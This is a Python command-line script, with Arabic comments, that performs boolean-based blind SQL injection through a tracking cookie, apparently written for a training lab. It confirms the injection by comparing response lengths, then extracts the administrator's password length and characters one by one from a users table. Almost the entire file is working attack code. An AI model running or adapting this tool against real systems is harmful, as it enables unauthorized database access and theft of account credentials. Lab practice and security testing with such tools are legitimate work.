#!/usr/bin/env python3
import requests
import sys
import time
from concurrent.futures import ThreadPoolExecutor

HEADERS = {'User-Agent': 'Mozilla/5.0 (Security-Scanner)'}

def test_condition(url, cookie_name, cookie_value, condition):
    """يختبر شرط"""
    try:
        cookies = {cookie_name: cookie_value + "' AND " + condition + "--"}
        r = requests.get(url, cookies=cookies, headers=HEADERS, timeout=10)
        return len(r.text)
    except:
        return 0

def find_cookie(url):
    """يكتشف اسم Cookie"""
    try:
        r = requests.get(url, headers=HEADERS, timeout=10)
        print(f"\n[*] Cookies found:")
        for cookie in r.cookies:
            print(f"    {cookie.name} = {cookie.value[:50]}...")
        return r.cookies
    except:
        return None

def blind_sqli(url, cookie_name, cookie_value):
    """Blind SQL Injection"""
    print(f"\n{'='*60}")
    print(f"  Blind SQL Injection Tester")
    print(f"  URL: {url}")
    print(f"  Cookie: {cookie_name}")
    print(f"{'='*60}\n")
    
    # Step 1: اختبر '1'='1' و '1'='2'
    print(f"[*] Testing condition...")
    len_true = test_condition(url, cookie_name, cookie_value, "'1'='1")
    time.sleep(0.5)
    len_false = test_condition(url, cookie_name, cookie_value, "'1'='2")
    
    print(f"  Length with '1'='1': {len_true}")
    print(f"  Length with '1'='2': {len_false}")
    
    if len_true == len_false:
        print(f"\n  [-] No difference — Blind SQLi not detected")
        return None
    
    print(f"\n  [+] Difference found! ({abs(len_true - len_false)} bytes)")
    print(f"  [+] Blind SQL Injection confirmed!")
    
    # Step 2: اكتشف طول كلمة السر
    print(f"\n[*] Finding password length...")
    baseline = len_true
    password_length = 0
    
    for i in range(1, 30):
        condition = f"(SELECT LENGTH(password) FROM users WHERE username='administrator')={i}"
        length = test_condition(url, cookie_name, cookie_value, condition)
        time.sleep(0.3)
        
        if length == baseline:
            password_length = i
            print(f"  [+] Password length: {i}")
            break
    
    if password_length == 0:
        print(f"  [-] Could not determine length")
        return None
    
    # Step 3: استخرج كلمة السر حرف حرف
    print(f"\n[*] Extracting password ({password_length} chars)...")
    chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    password = ''
    
    for pos in range(1, password_length + 1):
        for char in chars:
            condition = f"(SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}'"
            length = test_condition(url, cookie_name, cookie_value, condition)
            time.sleep(0.2)
            
            if length == baseline:
                password += char
                print(f"  [+] Position {pos}: {char}  (Password: {password})")
                break
    
    print(f"\n{'='*60}")
    print(f"  Password: {password}")
    print(f"{'='*60}\n")
    
    return password

def main():
    if len(sys.argv) < 3:
        print("Usage: python3 blind_sqli.py <url> <cookie_name> [cookie_value]")
        print("Example: python3 blind_sqli.py https://target.com/ TrackingId xyz")
        sys.exit(1)
    
    url = sys.argv[1]
    cookie_name = sys.argv[2]
    cookie_value = sys.argv[3] if len(sys.argv) > 3 else 'xyz'
    
    # إذا ما في cookie_value، اكتشف
    if len(sys.argv) < 4:
        print(f"\n[*] Discovering cookies...")
        cookies = find_cookie(url)
        if cookies:
            for cookie in cookies:
                if cookie_name.lower() in cookie.name.lower():
                    cookie_value = cookie.value
                    print(f"  [+] Found: {cookie_name} = {cookie_value[:50]}...")
                    break
    
    # شغل الأداة
    blind_sqli(url, cookie_name, cookie_value)

if __name__ == "__main__":
    main()
